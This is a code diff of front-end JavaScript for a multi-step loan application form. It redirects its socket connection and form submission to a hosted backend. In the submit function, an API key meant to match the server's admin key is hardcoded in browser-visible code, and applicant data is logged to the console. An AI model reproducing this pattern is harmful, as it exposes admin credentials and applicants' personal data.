@@ -1,4 +1,8 @@
-// ===== 1. DECLARE ALL GLOBALS AT THE TOP =====
+// ===== CONFIGURATION =====
+// 🔥 CHANGE THIS to your Render backend URL (without trailing slash)
+const BACKEND_URL = 'https://eco-cash-loans-a080.onrender.com'; // <-- YOUR RENDER URL
+
+// ===== 1. DECLARE ALL GLOBALS =====
 let currentStep = 1;
 const totalSteps = 3;
 
@@ -19,13 +23,14 @@ let socket = null;
 
 // ===== 2. DOM READY – INITIALIZE =====
 document.addEventListener('DOMContentLoaded', function() {
-  socket = io({ transports: ['websocket', 'polling'] });
+  // Connect Socket.io to the BACKEND (not GitHub Pages)
+  socket = io(BACKEND_URL, { transports: ['websocket', 'polling'] });
   
   socket.on('connect', () => console.log('✅ Connected to server'));
   socket.on('disconnect', () => console.log('❌ Disconnected'));
   socket.on('statusUpdated', (data) => console.log('Status updated:', data));
 
-  // Attach event listeners to Next/Prev buttons
+  // Attach event listeners
   document.querySelectorAll('.next-btn').forEach(btn => {
     btn.addEventListener('click', function(e) {
       e.preventDefault();
@@ -51,17 +56,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
 // ===== 3. STEP NAVIGATION =====
 function showStep(step) {
-  document.querySelectorAll('.screen').forEach(el => {
-    el.style.display = 'none';
-  });
-
+  document.querySelectorAll('.screen').forEach(el => el.style.display = 'none');
   const target = document.getElementById(`step${step}`);
-  if (target) {
-    target.style.display = 'block';
-  }
-
+  if (target) target.style.display = 'block';
   if (step === 3) updateSummary();
-
   document.querySelectorAll('.step-dot').forEach((dot, idx) => {
     dot.classList.toggle('active', idx < step);
   });
@@ -70,7 +68,6 @@ function showStep(step) {
 function goToNextStep() {
   const stepEl = document.getElementById(`step${currentStep}`);
   if (!stepEl) return;
-
   const inputs = stepEl.querySelectorAll('input, select, textarea');
   let valid = true;
   inputs.forEach(input => {
@@ -83,27 +80,14 @@ function goToNextStep() {
       else { input.style.borderColor = ''; }
     }
   });
-
-  if (!valid) {
-    alert('Please fill in all required fields.');
-    return;
-  }
-
+  if (!valid) { alert('Please fill in all required fields.'); return; }
   saveStepData(currentStep);
-
-  if (currentStep < totalSteps) {
-    currentStep++;
-    showStep(currentStep);
-  } else {
-    submitForm();
-  }
+  if (currentStep < totalSteps) { currentStep++; showStep(currentStep); }
+  else { submitForm(); }
 }
 
 function goToPrevStep() {
-  if (currentStep > 1) {
-    currentStep--;
-    showStep(currentStep);
-  }
+  if (currentStep > 1) { currentStep--; showStep(currentStep); }
 }
 
 function saveStepData(step) {
@@ -135,13 +119,12 @@ function updateSummary() {
   document.getElementById('sum-applicant').textContent = fullName;
 }
 
-// ===== 4. SUBMIT WITH PROPER ERROR HANDLING =====
+// ===== 4. SUBMIT – NOW USING BACKEND URL =====
 function submitForm() {
   saveStepData(currentStep);
   updateSummary();
 
-  // 🔑 IMPORTANT: Change this to match your .env ADMIN_API_KEY!
-  const API_KEY = '8653026083';  // <-- CHANGE THIS to match your .env
+  const API_KEY = '8653026083'; // <-- MUST MATCH your .env on Render
 
   const payload = {
     userId: appData.phone || 'guest',
@@ -151,11 +134,10 @@ function submitForm() {
   };
 
   console.log('📤 Submitting payload:', payload);
-  console.log('🔑 Using API Key:', API_KEY);
-
   document.getElementById('overlay').style.display = 'flex';
 
-  fetch('/api/transactions', {
+  // 🔥 USE THE FULL BACKEND URL
+  fetch(`${BACKEND_URL}/api/transactions`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -167,10 +149,7 @@ function submitForm() {
     const text = await res.text();
     console.log('📥 Server response status:', res.status);
     console.log('📥 Server response body:', text);
-    
-    if (!res.ok) {
-      throw new Error(`Server returned ${res.status}: ${text}`);
-    }
+    if (!res.ok) throw new Error(`Server returned ${res.status}: ${text}`);
     return JSON.parse(text);
   })
   .then(data => {
@@ -189,24 +168,12 @@ function submitForm() {
 
 // ===== 5. UTILITY FUNCTIONS =====
 function moveToNext(input, nextId) {
-  if (input.value.length >= 1 && nextId) {
-    document.getElementById(nextId).focus();
-  }
+  if (input.value.length >= 1 && nextId) document.getElementById(nextId).focus();
 }
-
-function verifyOTP() {
-  alert('OTP verification logic goes here.');
-}
-function resendOTP() {
-  alert('OTP resent.');
-}
-function requestNewOTP() {
-  alert('New OTP requested.');
-}
-function toggleMenu() {
-  alert('Menu toggled');
-}
-
+function verifyOTP() { alert('OTP verification logic goes here.'); }
+function resendOTP() { alert('OTP resent.'); }
+function requestNewOTP() { alert('New OTP requested.'); }
+function toggleMenu() { alert('Menu toggled'); }
 function showScreen(screenId) {
   document.querySelectorAll('.screen').forEach(el => el.style.display = 'none');
   document.getElementById(screenId).style.display = 'block';
